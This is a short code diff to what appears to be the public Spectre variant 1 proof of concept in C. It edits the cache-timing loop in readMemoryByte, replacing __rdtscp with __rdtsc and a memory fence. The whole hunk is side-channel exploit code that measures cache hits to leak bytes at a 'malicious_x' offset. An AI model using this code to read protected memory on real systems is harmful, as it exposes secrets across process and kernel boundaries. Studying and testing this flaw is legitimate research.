@@ -81,9 +81,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		{
 			mix_i = ((i * 167) + 13) & 255;
 			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk); /* READ TIMER */
-			junk = *addr; /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+			time1 = __rdtsc(); /* READ TIMER */
+                        junk = *addr; /* MEMORY ACCESS TO TIME */
+                        _mm_mfence();
+                        time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
